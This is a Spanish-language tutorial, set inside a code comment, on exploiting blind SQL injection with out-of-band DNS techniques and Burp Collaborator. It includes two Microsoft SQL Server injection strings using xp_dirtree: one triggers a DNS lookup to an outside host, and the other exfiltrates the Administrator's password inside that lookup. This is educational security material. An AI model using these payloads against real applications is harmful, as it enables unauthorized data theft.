/*
Explotación de inyección SQL ciega usando técnicas fuera de banda (OAST)
Una aplicación podría realizar la misma consulta SQL que en el ejemplo anterior, pero hacerlo de manera asíncrona.
La aplicación continúa procesando la solicitud del usuario en el hilo original y usa otro hilo para ejecutar una
consulta SQL utilizando la cookie de seguimiento. La consulta sigue siendo vulnerable a inyección SQL, pero ninguna
de las técnicas descritas hasta ahora funcionará. La respuesta de la aplicación no depende de que la consulta devuelva
algún dato, de que ocurra un error de base de datos, ni del tiempo que tome ejecutar la consulta.

En esta situación, a menudo es posible explotar la vulnerabilidad de inyección SQL ciega activando interacciones
de red fuera de banda con un sistema que controlas. Estas pueden ser activadas basándose en una condición inyectada
para inferir información una pieza a la vez. De manera más útil, los datos pueden ser exfiltrados directamente dentro
de la interacción de red.

Se pueden usar una variedad de protocolos de red para este propósito, pero típicamente el más efectivo es DNS
(servicio de nombres de dominio). Muchas redes de producción permiten la salida libre de consultas DNS, ya que son
esenciales para el funcionamiento normal de los sistemas de producción.


La herramienta más fácil y confiable para usar técnicas fuera de banda es Burp Collaborator.
Este es un servidor que proporciona implementaciones personalizadas de varios servicios de red, incluido DNS.
Te permite detectar cuándo ocurren interacciones de red como resultado de enviar cargas útiles individuales
a una aplicación vulnerable. Burp Suite Professional incluye un cliente integrado que está configurado para
trabajar con Burp Collaborator desde el principio. Para más información, consulta la documentación de Burp Collaborator.

Las técnicas para activar una consulta DNS son específicas del tipo de base de datos que se esté utilizando.
Por ejemplo, la siguiente entrada en Microsoft SQL Server se puede usar para causar una búsqueda DNS en un dominio específico:

'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--

Esto hace que la base de datos realice una búsqueda para el siguiente dominio:

0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net

Puedes usar Burp Collaborator para generar un subdominio único y sondear el servidor Collaborator para confirmar cuándo ocurren búsquedas DNS.


Confirmada una forma de activar interacciones fuera de banda, puedes usar el canal fuera de banda para exfiltrar datos de
la aplicación vulnerable. Por ejemplo:

'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--

Esta entrada lee la contraseña del usuario Administrador, añade un subdominio único de Collaborator, y activa una búsqueda DNS.
Esta búsqueda te permite ver la contraseña capturada:

S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net

Las técnicas fuera de banda (OAST) son una forma poderosa de detectar y explotar inyecciones SQL ciegas, debido a la alta
probabilidad de éxito y la capacidad de exfiltrar datos directamente dentro del canal fuera de banda. Por esta razón, las
técnicas OAST a menudo son preferibles incluso en situaciones donde otras técnicas para explotación ciega también funcionan.

Nota
Hay varias formas de activar interacciones fuera de banda, y diferentes técnicas se aplican a diferentes tipos de bases de datos.
Para más detalles, consulta la hoja de trucos de inyección SQL.




*/